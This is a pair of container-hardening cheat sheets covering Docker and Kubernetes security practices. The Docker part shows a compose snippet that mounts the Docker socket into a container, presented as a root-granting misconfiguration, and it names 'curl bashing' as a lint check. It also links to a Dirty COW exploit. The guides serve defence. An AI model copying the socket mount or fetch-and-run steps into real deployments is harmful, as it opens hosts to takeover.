

---
# Docker_Security_Cheat_Sheet.md

# Docker Security Cheat Sheet

## Introduction

Docker is the most popular containerization technology. When used correctly, it can enhance security compared to running applications directly on the host system. However, certain misconfigurations can reduce security levels or introduce new vulnerabilities.

The aim of this cheat sheet is to provide a straightforward list of common security errors and best practices to assist in securing your Docker containers.

## Rules

### RULE \#0 - Keep Host and Docker up to date

To protect against known container escape vulnerabilities like [Leaky Vessels](https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/), which typically result in the attacker gaining root access to the host, it's vital to keep both the host and Docker up to date. This includes regularly updating the host kernel as well as the Docker Engine.

This is due to the fact that containers share the host's kernel. If the host's kernel is vulnerable, the containers are also vulnerable. For example, the kernel privilege escalation exploit, [Dirty COW](https://github.com/scumjr/dirtycow-vdso), executed inside a well-insulated container would still result in root access on a vulnerable host.

### RULE \#1 - Do not expose the Docker daemon socket (even to the containers)

Docker socket _/var/run/docker.sock_ is the UNIX socket that Docker is listening to. This is the primary entry point for the Docker API. The owner of this socket is root. Giving someone access to it is equivalent to giving unrestricted root access to your host.

**Do not enable _tcp_ Docker daemon socket.** If you are running docker daemon with `-H tcp://0.0.0.0:XXX` or similar you are exposing unencrypted and unauthenticated direct access to the Docker daemon, if the host is internet connected this means the docker daemon on your computer can be used by anyone from the public internet.
If you really, **really** have to do this, you should secure it. Check how to do this following [Docker official documentation](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option).

**Do not expose _/var/run/docker.sock_ to other containers**. If you are running your docker image with `-v /var/run/docker.sock://var/run/docker.sock` or similar, you should change it. Remember that mounting the socket read-only is not a solution but only makes it harder to exploit. Equivalent in the docker compose file is something like this:

```yaml
volumes:
  - "/var/run/docker.sock:/var/run/docker.sock"
```

### RULE \#2 - Set a user

Configuring the container to use an unprivileged user is the best way to prevent privilege escalation attacks. This can be accomplished in three different ways as follows:

1. During runtime using `-u` option of `docker run` command e.g.:

```bash
docker run -u 4000 alpine
```

2. During build time. Simply add user in Dockerfile and use it. For example:

```dockerfile
FROM alpine
RUN groupadd -r myuser && useradd -r -g myuser myuser
#    <HERE DO WHAT YOU HAVE TO DO AS A ROOT USER LIKE INSTALLING PACKAGES ETC.>
USER myuser
```

3. Enable user namespace support (`--userns-remap=default`) in [Docker daemon](https://docs.docker.com/engine/security/userns-remap/#enable-userns-remap-on-the-daemon)

More information about this topic can be found at [Docker official documentation](https://docs.docker.com/engine/security/userns-remap/). For additional security, you can also run in rootless mode, which is discussed in [Rule \#11](#rule-11---run-docker-in-rootless-mode).

In Kubernetes, this can be configured in [Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) using the `runAsUser` field with the user ID e.g:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: example
      image: gcr.io/google-samples/node-hello:1.0
      securityContext:
        runAsUser: 4000 # <-- This is the pod user ID
```

As a Kubernetes cluster administrator, you can configure a hardened default using the [`Restricted` level](https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted) with built-in [Pod Security admission controller](https://kubernetes.io/docs/concepts/security/pod-security-admission/), if greater customization is desired consider using [Admission Webhooks](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#what-are-admission-webhooks) or a [third party alternative](https://kubernetes.io/docs/concepts/security/pod-security-standards/#alternatives).

### RULE \#3 - Limit capabilities (Grant only specific capabilities, needed by a container)

[Linux kernel capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html) are a set of privileges that can be used by privileged. Docker, by default, runs with only a subset of capabilities.
You can change it and drop some capabilities (using `--cap-drop`) to harden your docker containers, or add some capabilities (using `--cap-add`) if needed.
Remember not to run containers with the `--privileged` flag - this will add ALL Linux kernel capabilities to the container.

The most secure setup is to drop all capabilities `--cap-drop all` and then add only required ones. For example:

```bash
docker run --cap-drop all --cap-add CHOWN alpine
```

**And remember: Do not run containers with the _--privileged_ flag!!!**

In Kubernetes this can be configured in [Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) using `capabilities` field e.g:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: example
      image: gcr.io/google-samples/node-hello:1.0
      securityContext:
        capabilities:
          drop:
            - ALL
          add: ["CHOWN"]
```

As a Kubernetes cluster administrator, you can configure a hardened default using the [`Restricted` level](https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted) with built-in [Pod Security admission controller](https://kubernetes.io/docs/concepts/security/pod-security-admission/), if greater customization is desired consider using [Admission Webhooks](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#what-are-admission-webhooks) or a [third party alternative](https://kubernetes.io/docs/concepts/security/pod-security-standards/#alternatives).

### RULE \#4 - Prevent in-container privilege escalation

Always run your docker images with `--security-opt=no-new-privileges` in order to prevent privilege escalation. This will prevent the container from gaining new privileges via `setuid` or `setgid` binaries.

In Kubernetes, this can be configured in [Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) using `allowPrivilegeEscalation` field e.g.:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: example
      image: gcr.io/google-samples/node-hello:1.0
      securityContext:
        allowPrivilegeEscalation: false
```

As a Kubernetes cluster administrator, you can configure a hardened default using the [`Restricted` level](https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted) with built-in [Pod Security admission controller](https://kubernetes.io/docs/concepts/security/pod-security-admission/), if greater customization is desired consider using [Admission Webhooks](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#what-are-admission-webhooks) or a [third party alternative](https://kubernetes.io/docs/concepts/security/pod-security-standards/#alternatives).

### RULE \#5 - Be mindful of Inter-Container Connectivity

Inter-Container Connectivity (icc) is enabled by default, allowing all containers to communicate with each other through the [`docker0` bridged network](https://docs.docker.com/network/drivers/bridge/). Instead of using the `--icc=false` flag with the Docker daemon, which completely disables inter-container communication, consider defining specific network configurations. This can be achieved by creating custom Docker networks and specifying which containers should be attached to them. This method provides more granular control over container communication.

For detailed guidance on configuring Docker networks for container communication, refer to the [Docker Documentation](https://docs.docker.com/network/#communication-between-containers).

In Kubernetes environments, [Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/) can be used to define rules that regulate pod interactions within the cluster. These policies provide a robust framework to control how pods communicate with each other and with other network endpoints. Additionally, [Network Policy Editor](https://networkpolicy.io/) simplifies the creation and management of network policies, making it more accessible to define complex networking rules through a user-friendly interface.

### RULE \#6 - Use Linux Security Module (seccomp, AppArmor, or SELinux) for Runtime Security

**First of all, do not disable default security profile!** Always start with Docker’s or your host’s default profile as a baseline.

**Security Profile Recommendations:**

- **Seccomp**: Restrict syscalls to the minimum required for your container. Use Docker’s default seccomp profile as a starting point and customize per workload. [Docker Seccomp](https://docs.docker.com/engine/security/seccomp/)

- **AppArmor**: Apply per-container AppArmor profiles to enforce mandatory access controls. [Docker AppArmor](https://docs.docker.com/engine/security/apparmor/)

- **SELinux**: Enable SELinux on the host and ensure containers are labeled properly. Enforce SELinux policies to prevent unauthorized access to host resources. [SELinux Guide for Docker](https://docs.docker.com/engine/security/selinux/)

**Runtime Security Improvements:**

- **Behavioral Monitoring**: Use tools like [Falco](https://falco.org/), [Tetragon](https://cilium.io/), or [Cilium eBPF](https://cilium.io/) to detect unexpected or malicious container activity. Examples: Unexpected exec calls, privilege escalation attempts, unusual network connections.  

- **Anomaly Detection**: Continuously monitor container processes, filesystem changes, and network activity to identify abnormal patterns in real time.  

- **Kubernetes Security Context**: Configure pods or containers with seccomp and AppArmor profiles in Kubernetes. [Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tutorials/security/seccomp/)

### RULE \#7 - Limit resources (memory, CPU, file descriptors, processes, restarts)

The best way to avoid DoS attacks is by limiting resources. You can limit [memory](https://docs.docker.com/config/containers/resource_constraints/#memory), [CPU](https://docs.docker.com/config/containers/resource_constraints/#cpu), maximum number of restarts (`--restart=on-failure:<number_of_restarts>`), maximum number of file descriptors (`--ulimit nofile=<number>`) and maximum number of processes (`--ulimit nproc=<number>`).

[Check documentation for more details about ulimits](https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit)

You can also do this for Kubernetes: [Assign Memory Resources to Containers and Pods](https://kubernetes.io/docs/tasks/configure-pod-container/assign-memory-resource/), [Assign CPU Resources to Containers and Pods](https://kubernetes.io/docs/tasks/configure-pod-container/assign-cpu-resource/) and [Assign Extended Resources to a Container](https://kubernetes.io/docs/tasks/configure-pod-container/extended-resource/)

### RULE \#8 - Set filesystem and volumes to read-only

**Run containers with a read-only filesystem** using `--read-only` flag. For example:

```bash
docker run --read-only alpine sh -c 'echo "whatever" > /tmp'
```

If an application inside a container has to save something temporarily, combine `--read-only` flag with `--tmpfs` like this:

```bash
docker run --read-only --tmpfs /tmp alpine sh -c 'echo "whatever" > /tmp/file'
```

The Docker Compose `compose.yml` equivalent would be:

```yaml
version: "3"
services:
  alpine:
    image: alpine
    read_only: true
```

Equivalent in Kubernetes in [Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/):

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: example
      image: gcr.io/google-samples/node-hello:1.0
      securityContext:
        readOnlyRootFilesystem: true
```

In addition, if the volume is mounted only for reading **mount them as a read-only**
It can be done by appending `:ro` to the `-v` like this:

```bash
docker run -v volume-name:/path/in/container:ro alpine
```

Or by using `--mount` option:

```bash
docker run --mount source=volume-name,destination=/path/in/container,readonly alpine
```

### RULE \#9 - Integrate container scanning tools into your CI/CD pipeline

[CI/CD pipelines](CI_CD_Security_Cheat_Sheet.md) are a crucial part of the software development lifecycle and should include various security checks such as lint checks, static code analysis, and container scanning.

Many issues can be prevented by following some best practices when writing the Dockerfile. However, adding a security linter as a step in the build pipeline can go a long way in avoiding further headaches. Some issues that are commonly checked are:

- Ensure a `USER` directive is specified
- Ensure the base image version is pinned
- Ensure the OS packages versions are pinned
- Avoid the use of `ADD` in favor of `COPY`
- Avoid curl bashing in `RUN` directives

References:

- [Docker Baselines on DevSec](https://dev-sec.io/baselines/docker/)
- [Use the Docker command line](https://docs.docker.com/engine/reference/commandline/cli/)
- [Overview of Docker Compose v2 CLI](https://docs.docker.com/compose/reference/overview/)
- [Configuring Logging Drivers](https://docs.docker.com/config/containers/logging/configure/)
- [View logs for a container or service](https://docs.docker.com/config/containers/logging/)
- [Dockerfile Security Best Practices](https://cloudberry.engineering/article/dockerfile-security-best-practices/)

Container scanning tools are especially important as part of a successful security strategy. They can detect known vulnerabilities, secrets and misconfigurations in container images and provide a report of the findings with recommendations on how to fix them. Some examples of popular container scanning tools are:

- Free
    - [Clair](https://github.com/coreos/clair)
    - [ThreatMapper](https://github.com/deepfence/ThreatMapper)
    - [Trivy](https://github.com/aquasecurity/trivy)
- Commercial
    - [Snyk](https://snyk.io/) **(open source and free option available)**
    - [Anchore](https://github.com/anchore/grype/) **(open source and free option available)**
    - [Docker Scout](https://www.docker.com/products/docker-scout/) **(open source and free option available)**
    - [JFrog XRay](https://jfrog.com/xray/)
    - [Qualys](https://www.qualys.com/apps/container-security/)

To detect secrets in images:

- [ggshield](https://github.com/GitGuardian/ggshield) **(open source and free option available)**
- [SecretScanner](https://github.com/deepfence/SecretScanner) **(open source)**

To detect misconfigurations in Kubernetes:

- [kubeaudit](https://github.com/Shopify/kubeaudit)
- [kubesec.io](https://kubesec.io/)
- [kube-bench](https://github.com/aquasecurity/kube-bench)

To detect misconfigurations in Docker:

- [inspec.io](https://www.inspec.io/docs/reference/resources/docker/)
- [dev-sec.io](https://dev-sec.io/baselines/docker/)
- [Docker Bench for Security](https://github.com/docker/docker-bench-security)

### RULE \#10 - Keep the Docker daemon logging level at `info`

By default, the Docker daemon is configured to have a base logging level of `info`. This can be verified by checking the daemon configuration file `/etc/docker/daemon.json` for the`log-level` key. If the key is not present, the default logging level is `info`. Additionally, if the docker daemon is started with the `--log-level` option, the value of the `log-level` key in the configuration file will be overridden. To check if the Docker daemon is running with a different log level, you can use the following command:

```bash
ps aux | grep '[d]ockerd.*--log-level' | awk '{for(i=1;i<=NF;i++) if ($i ~ /--log-level/) print $i}'
```

Setting an appropriate log level, configures the Docker daemon to log events that you would want to review later. A base log level of 'info' and above would capture all logs except the debug logs. Until and unless required, you should not run docker daemon at the 'debug' log level.

### Rule \#11 - Run Docker in rootless mode

Rootless mode ensures that the Docker daemon and containers are running as an unprivileged user, which means that even if an attacker breaks out of the container, they will not have root privileges on the host, which in turn substantially limits the attack surface. This is different to [userns-remap](#rule-2---set-a-user) mode, where the daemon still operates with root privileges.

Evaluate the [specific requirements](Attack_Surface_Analysis_Cheat_Sheet.md) and [security posture](Threat_Modeling_Cheat_Sheet.md) of your environment to determine if rootless mode is the best choice for you. For environments where security is a paramount concern and the [limitations of rootless mode](https://docs.docker.com/engine/security/rootless/#known-limitations) do not interfere with operational requirements, it is a strongly recommended configuration. Alternatively consider using [Podman](#podman-as-an-alternative-to-docker) as an alternative to Docker.

> Rootless mode allows running the Docker daemon and containers as a non-root user to mitigate potential vulnerabilities in the daemon and the container runtime.
> Rootless mode does not require root privileges even during the installation of the Docker daemon, as long as the [prerequisites](https://docs.docker.com/engine/security/rootless/#prerequisites) are met.

Read more about rootless mode and its limitations, installation and usage instructions on [Docker documentation](https://docs.docker.com/engine/security/rootless/) page.

### RULE \#12 - Utilize Docker Secrets for Sensitive Data Management

Docker Secrets provide a secure way to store and manage sensitive data such as passwords, tokens, and SSH keys. Using Docker Secrets helps in avoiding the exposure of sensitive data in container images or in runtime commands.

```bash
docker secret create my_secret /path/to/super-secret-data.txt
docker service create --name web --secret my_secret nginx:latest
```

Or for Docker Compose:

```yaml
version: "3.8"
secrets:
  my_secret:
    file: ./super-secret-data.txt
services:
  web:
    image: nginx:latest
    secrets:
      - my_secret
```

While Docker Secrets generally provide a secure way to manage sensitive data in Docker environments, this approach is not recommended for Kubernetes, where secrets are stored in plaintext by default. In Kubernetes, consider using additional security measures such as etcd encryption, or third-party tools. Refer to the [Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md) for more information.

### RULE \#13 - Enhance Supply Chain Security

Building on the principles in [Rule \#9](#rule-9---integrate-container-scanning-tools-into-your-cicd-pipeline), enhancing supply chain security involves implementing additional measures to secure the entire lifecycle of container images from creation to deployment. Some of the key practices include:

- [Image Provenance](https://slsa.dev/spec/v1.0/provenance): Document the origin and history of container images to ensure traceability and integrity.
- [SBOM Generation](https://cyclonedx.org/guides/CycloneDX%20One%20Pager.pdf): Create a Software Bill of Materials (SBOM) for each image, detailing all components, libraries, and dependencies for transparency and vulnerability management.
- [Image Signing](https://github.com/notaryproject/notary): Digitally sign images to verify their integrity and authenticity, establishing trust in their security.
- [Trusted Registry](https://snyk.io/learn/container-security/container-registry-security/): Store the documented, signed images with their SBOMs in a secure registry that enforces strict [access controls](Access_Control_Cheat_Sheet.md) and supports metadata management.
- [Secure Deployment](https://www.openpolicyagent.org/docs/latest/#overview): Implement secure deployment polices, such as image validation, runtime security, and continuous monitoring, to ensure the security of the deployed images.

## Podman as an alternative to Docker

[Podman](https://podman.io/) is an OCI-compliant, open-source container management tool developed by [Red Hat](https://www.redhat.com/en) that provides a Docker-compatible command-line interface and a desktop application for managing containers. It is designed to be a more secure and lightweight alternative to Docker, especially for environments where secure defaults are preferred. Some of the security benefits of Podman include:

1. Daemonless Architecture: Unlike Docker, which requires a central daemon (dockerd) to create, run, and manage containers, Podman directly employs the fork-exec model. When a user requests to start a container, Podman forks from the current process, then the child process execs into the container's runtime.
2. Rootless Containers: The fork-exec model facilitates Podman's ability to run containers without requiring root privileges. When a non-root user initiates a container start, Podman forks and execs under the user's permissions.
3. SELinux Integration: Podman is built to work with SELinux, which provides an additional layer of security by enforcing mandatory access controls on containers and their interactions with the host system.

## References and Further Reading

[OWASP Docker Top 10](https://github.com/OWASP/Docker-Security)
[Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
[Docker Engine Security](https://docs.docker.com/engine/security/)
[Kubernetes Security Cheat Sheet](Kubernetes_Security_Cheat_Sheet.md)
[SLSA - Supply Chain Levels for Software Artifacts](https://slsa.dev/)
[Sigstore](https://sigstore.dev/)
[Docker Build Attestation](https://docs.docker.com/build/attestations/)
[Docker Content Trust](https://docs.docker.com/engine/security/trust/)


---
# Kubernetes_Security_Cheat_Sheet.md

# Kubernetes Security Cheat Sheet

## Overview

This cheat sheet provides a starting point for securing a Kubernetes cluster. It is divided into the following categories:

- Receive Alerts for Kubernetes Updates
- INTRODUCTION: What is Kubernetes?
- Securing Kubernetes hosts
- Securing Kubernetes components
- Using the Kubernetes dashboard
- Kubernetes Security Best Practices: Build Phase
- Kubernetes Security Best Practices: Deploy Phase
- Kubernetes Security Best Practices: Runtime Phase

For more information about Kubernetes, refer to the Appendix.

## Receive Alerts for Security Updates and Reporting Vulnerabilities

Join the kubernetes-announce group (<https://kubernetes.io/docs/reference/issues-security/security/>) for emails about security announcements. See the security reporting page (<https://kubernetes.io/docs/reference/issues-security/security>) for more on how to report vulnerabilities.

## INTRODUCTION: What Is Kubernetes?

Kubernetes is an open source container orchestration engine for automating deployment, scaling, and management of containerized applications. The open source project is hosted by the Cloud Native Computing Foundation (CNCF).

When you deploy Kubernetes, you get a cluster. A Kubernetes cluster consists of a set of worker machines, called nodes that run containerized applications. The control plane manages the worker nodes and the Pods in the cluster.

### Control Plane Components

The control plane's components make global decisions about the cluster, as well as detecting and responding to cluster events. It consists of components such as kube-apiserver, etcd, kube-scheduler, kube-controller-manager and cloud-controller-manager.

**Component:** kube-apiserver  
**Description:** Exposes the Kubernetes API. The API server is the front end for the Kubernetes control plane.

**Component:** etcd  
**Description:** A consistent and highly-available key-value store used as Kubernetes' backing store for all cluster data.

**Component:** kube-scheduler  
**Description:** Watches for newly created Pods with no assigned node, and selects a node for them to run on.

**Component:** kube-controller-manager  
**Description:** Runs controller processes. Logically, each controller is a separate process, but to reduce complexity, they are all compiled into a single binary and run in a single process.

**Component:** cloud-controller-manager  
**Description:** The cloud controller manager lets you link your cluster into your cloud provider's API, and separates out the components that interact with that cloud platform from components that just interact with your cluster.

### Node Components

Node components run on every node, maintaining running pods and providing the Kubernetes runtime environment. It consists of components such as kubelet, kube-proxy and container runtime.

**Component:** kubelet  
**Description:** An agent that runs on each node in the cluster. It makes sure that containers are running in a Pod.

**Component:** kube-proxy  
**Description:** A network proxy that runs on each node in your cluster, implementing part of the Kubernetes Service concept.

**Container:** runtime  
**Description:** The container runtime is the software that is responsible for running containers |

## SECTION 1: Securing Kubernetes Hosts

Kubernetes can be deployed in different ways: on bare metal, on-premise, and in the public cloud (a custom Kubernetes build on virtual machines OR use a managed service). Since Kubernetes is designed to be highly portable, customers can easily and migrate their workloads and switch between multiple installations.

Because Kubernetes can be designed to fit a large variety of scenarios, this flexibility is a weakness when it comes to securing Kubernetes clusters. The engineers responsible for deploying the Kubernetes platform must know about all the potential attack vectors and vulnerabilities for their clusters.

To harden the underlying hosts for Kubernetes clusters, we recommend that you install the latest version of the operating systems, harden the operating systems, implement necessary patch management and configuration management systems, implement essential firewall rules and undertake specific datacenter-based security measures.

### Updating Kubernetes

Since no one can track all potential attack vectors for your Kubernetes cluster, the first and best defense is to always run the latest stable version of Kubernetes.

In case vulnerabilities are found in running containers, it is recommended to always update the source image and redeploy the containers. **Try to avoid direct updates to the running containers as this can break the image-container relationship.**

```
Example: apt-update
```

**Upgrading containers is extremely easy with the Kubernetes rolling updates feature - this allows gradually updating a running application by upgrading its images to the latest version.**

#### Release schedule for Kubernetes

The Kubernetes project maintains release branches for the most recent three minor releases and it backports the applicable fixes, including security fixes, to those three release branches, depending on severity and feasibility. Patch releases are cut from those branches at a regular cadence, plus additional urgent releases, when required. Hence it is always recommended to upgrade the Kubernetes cluster to the latest available stable version. It is recommended to refer to the version skew policy for further details <https://kubernetes.io/docs/setup/release/version-skew-policy/>.

There are several techniques such as rolling updates, and node pool migrations that allow you to complete an update with minimal disruption and downtime.

--

## SECTION 2: Securing Kubernetes Components

This section discusses how to secure Kubernetes components. It covers the following topics:

- Securing the Kubernetes Dashboard
- Restricting access to etcd (Important)
- Controlling network access to sensitive ports
- Controlling access to the Kubernetes API
- Implementing role-based access control in Kubernetes
- Limiting access to Kubelets

--

### Securing the Kubernetes Dashboard

The Kubernetes dashboard is a webapp for managing your cluster. It is not a part of the Kubernetes cluster itself, it has to be installed by the owners of the cluster. Thus, there are a lot of tutorials on how to do this. Unfortunately, most of them create a service account with very high privileges. This caused Tesla and some others to be hacked via such a poorly configured K8s dashboard. (Reference: Tesla cloud resources are hacked to run cryptocurrency-mining malware - <https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware/>)

To prevent attacks via the dashboard, you should follow some tips:

- Do not expose the dashboard without additional authentication to the public. There is no need to access such a powerful tool from outside your LAN
- Turn on Role-Based Access Control (see below), so you can limit the service account the dashboard uses
- Do not grant the service account of the dashboard high privileges
- Grant permissions per user, so each user only can see what they are supposed to see
- If you are using network policies, you can block requests to the dashboard even from internal pods (this will not affect the proxy tunnel via kubectl proxy)
- Before version 1.8, the dashboard had a service account with full privileges, so check that there is no role binding for cluster-admin left.
- Deploy the dashboard with an authenticating reverse proxy, with multi-factor authentication enabled. This can be done with either embedded OIDC `id_tokens` or using Kubernetes Impersonation. This allows you to use the dashboard with the user's credentials instead of using a privileged `ServiceAccount`. This method can be used on both on-prem and managed cloud clusters.

--

### Restricting Access To etcd (IMPORTANT)

etcd is a critical Kubernetes component which stores information on states and secrets, and it should be protected differently from the rest of your cluster. Write access to the API server's etcd is equivalent to gaining root on the entire cluster, and even read access can be used to escalate privileges fairly easily.

The Kubernetes scheduler will search etcd for pod definitions that do not have a node. It then sends the pods it finds to an available kubelet for scheduling. Validation for submitted pods is performed by the API server before it writes them to etcd, so malicious users writing directly to etcd can bypass many security mechanisms - e.g. PodSecurityPolicies.

Administrators should always use strong credentials from the API servers to their etcd server, such as mutual auth via TLS client certificates, and it is often recommended to isolate the etcd servers behind a firewall that only the API servers may access.

#### Limiting access to the primary etcd instance

Allowing other components within the cluster to access the primary etcd instance with read or write access to the full keyspace is equivalent to granting cluster-admin access. Using separate etcd instances for other components or using etcd ACLs to restrict read and write access to a subset of the keyspace is strongly recommended.

--

### Controlling Network Access to Sensitive Ports

It is highly recommended to configure authentication and authorization on the cluster and cluster nodes. Since Kubernetes clusters usually listen on a range of well-defined and distinctive ports, it is easier for attackers to identify the clusters and attack them.

An overview of the default ports used in Kubernetes is provided below. Make sure that your network blocks access to ports, and you should seriously consider limiting access to the Kubernetes API server to trusted networks.

**Control plane node(s):**

| Protocol | Port Range | Purpose                 |
| -------- | ---------- | ----------------------- |
| TCP      | 6443       | Kubernetes API Server   |
| TCP      | 2379-2380  | etcd server client API  |
| TCP      | 10250      | Kubelet API             |
| TCP      | 10259      | kube-scheduler          |
| TCP      | 10257      | kube-controller-manager |
| TCP      | 10255      | Read-Only Kubelet API   |

**Worker nodes:**

| Protocol | Port Range  | Purpose                |
| -------- | ----------- | ---------------------- |
| TCP      | 10248       | Kubelet Healthz API    |
| TCP      | 10249       | Kube-proxy Metrics API |
| TCP      | 10250       | Kubelet API            |
| TCP      | 10255       | Read-Only Kubelet API  |
| TCP      | 10256       | Kube-proxy Healthz API |
| TCP      | 30000-32767 | NodePort Services      |

--

### Controlling Access To The Kubernetes API

The first line of defense of Kubernetes against attackers is limiting and securing access to API requests, because those requests are used to control the Kubernetes platform. For more information, refer to the documentation at <https://kubernetes.io/docs/reference/access-authn-authz/controlling-access/>.

This part contains the following topics:

- How Kubernetes handles API authorization
- External API Authentication for Kubernetes (recommended)
- Kubernetes Built-In API Authentication (not recommended)
- Implementing role-based access in Kubernetes
- Limiting access to Kubelets

--

#### How Kubernetes handles API authorization

In Kubernetes, you must be authenticated (logged in) before your request can be authorized (granted permission to access), and Kubernetes expects attributes that are common to REST API requests. This means that existing organization-wide or cloud-provider-wide access control systems which may handle other APIs work with Kubernetes authorization.

When Kubernetes authorizes API requests using the API server, permissions are denied by default. It evaluates all of the request attributes against all policies and allows or denies the request. All parts of an API request must be allowed by some policy in order to proceed.

--

#### External API Authentication for Kubernetes (RECOMMENDED)

Due to the weakness of Kubernetes' internal mechanisms for authenticating APIs, we strongly recommended that larger or production clusters use one of the external API authentication methods.

- [OpenID Connect](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#openid-connect-tokens) (OIDC) lets you externalize authentication, use short lived tokens, and leverage centralized groups for authorization.
- Managed Kubernetes distributions such as GKE, EKS and AKS support authentication using credentials from their respective IAM providers.
- [Kubernetes Impersonation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) can be used with both managed cloud clusters and on-prem clusters to externalize authentication without having to have access to the API server configuration parameters.

In addition to choosing the appropriate authentication system, API access should be considered privileged and use Multi-Factor Authentication (MFA) for all user access.

For more information, consult Kubernetes authentication reference documentation at <https://kubernetes.io/docs/reference/access-authn-authz/authentication>.

--

#### Options for Kubernetes Built-In API Authentication (NOT RECOMMENDED)

Kubernetes provides a number of internal mechanisms for API server authentication but these are usually only suitable for non-production or small clusters. We will briefly discuss each internal mechanism and explain why you should not use them.

- [Static Token File](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#static-token-file): Authentication makes use of clear text tokens stored in a CSV file on API server node(s). WARNING: You cannot modify credentials in this file until the API server is restarted.

- [X509 Client Certs](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#x509-client-certs) are available but are unsuitable for production use, since Kubernetes does [not support certificate revocation](https://github.com/kubernetes/kubernetes/issues/18982). As a result, these user credentials cannot be modified or revoked without rotating the root certificate authority key and re-issuing all cluster certificates.

- [Service Accounts Tokens](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens) are also available for authentication. Their primary intended use is to allow workloads running in the cluster to authenticate to the API server, however they can also be used for user authentication.

--

### Implementing Role-Based Access Control in Kubernetes

Role-based access control (RBAC) is a method for regulating access to computer or network resources based on the roles of individual users within your organization. Fortunately, Kubernetes comes with an integrated Role-Based Access Control (RBAC) component with default roles that allow you to define user responsibilities depending on what actions a client might want to perform. You should use the Node and RBAC authorizers together in combination with the NodeRestriction admission plugin.

The RBAC component matches an incoming user or group to a set of permissions linked to roles. These permissions combine verbs (get, create, delete) with resources (pods, services, nodes) and can be namespace or cluster scoped. RBAC authorization uses the rbac.authorization.k8s.io API group to drive authorization decisions, allowing you to dynamically configure policies through the Kubernetes API.

To enable RBAC, start the API server with the --authorization-mode flag set to a comma-separated list that includes RBAC; for example:

```bash
kube-apiserver --authorization-mode=Example,RBAC --other-options --more-options
```

For detailed examples of utilizing RBAC, refer to Kubernetes documentation at <https://kubernetes.io/docs/reference/access-authn-authz/rbac>

--

### Limiting access to the Kubelets

Kubelets expose HTTPS endpoints which grant powerful control over the node and containers. By default Kubelets allow unauthenticated access to this API. Production clusters should enable Kubelet authentication and authorization.

For more information, refer to Kubelet authentication/authorization documentation at <https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/>

--

## SECTION 3: Kubernetes Security Best Practices: Build Phase

During the build phase, you should secure your Kubernetes container images by building secure images and scanning those images for any known vulnerabilities.

--

### What is a container image?

A container image (CI) is an immutable, lightweight, standalone package that contains everything required to run an application — the application code, runtime, system libraries, configuration and system tools. Images are built as layered, read-only artifacts that are portable between hosts but share the host machine’s operating system kernel. See Docker: What is a container? (<https://www.docker.com/resources/what-container>).

Your CIs must be built on a approved and secure base image. This base image must be scanned and monitored at regular intervals to ensure that all CIs are based on a secure and authentic image. Implement strong governance policies that determine how images are built and stored in trusted image registries.

--

#### Ensure that CIs are up to date

Ensure your images (and any third-party tools you include) are up-to-date and use the latest versions of their components.

--

### Only use authorized images in Your environment

Downloading and running CIs from unknown sources is very dangerous. Make sure that only images adhering to the organization’s policy are allowed to run, or else the organization is open to risk of running vulnerable or even malicious containers.

--

### Use A CI Pipeline To Control and Identify Vulnerabilities

The Kubernetes container registry serves as a central repository of all container images in the system. Depending on your needs, you can utilize a public repository or have a private repository as the container registry. We recommend that you store your approved images in a private registry and only push approved images to these registries, which automatically reduces the number of potential images that enter your pipeline down to a fraction of the hundreds of thousands of publicly available images.

Also, we strongly recommend that you add a CI pipeline that integrates security assessment (like vulnerability scanning) into the build process. This pipeline should vet all code that is approved for production and is used to build the images. After an image is built, it should be scanned for security vulnerabilities. Only if no issues are found, then the image would be pushed to a private registry then deployed to production. If the security assessment mechanism fails any code, it should create a failure in the pipeline, which will help you find images with security problems and prevent them from entering the image registry.

Many source code repositories provide scanning capabilities (e.g. [Github](https://docs.github.com/en/code-security/supply-chain-security), [GitLab](https://docs.gitlab.com/ee/user/application_security/container_scanning/index.html)), and many CI tools offer integration with open source vulnerability scanners such as [Trivy](https://github.com/aquasecurity/trivy) or [Grype](https://github.com/anchore/grype).

Projects are developing image authorization plugins for Kubernetes that prevent unauthorized images from shipping. For more information, refer to the PR <https://github.com/kubernetes/kubernetes/pull/27129>.

--

### Minimize Features in All CIs

As a best practice, Google and other tech giants have strictly limiting the code in their runtime container for years. This approach improves the signal-to-noise of scanners (e.g. CVE) and reduces the burden of establishing provenance to just what you need.

Consider using minimal CIs such as distroless images (see below). If this is not possible, do not include OS package managers or shells in CIs because they may have unknown vulnerabilities. If you absolutely must include any OS packages, remove the package manager at a later step in the generation process.

--

#### Use distroless or empty images when possible

Distroless images sharply reduce the attack surface because they do not include shells and contain fewer packages than other images. For more information on distroless images, refer to <https://github.com/GoogleContainerTools/distroless>.

An empty image, ideal for statically compiled languages like Go, because the image is empty - the attack surface it is truly minimal - only your code!

For more information, refer to <https://hub.docker.com/_/scratch>

---

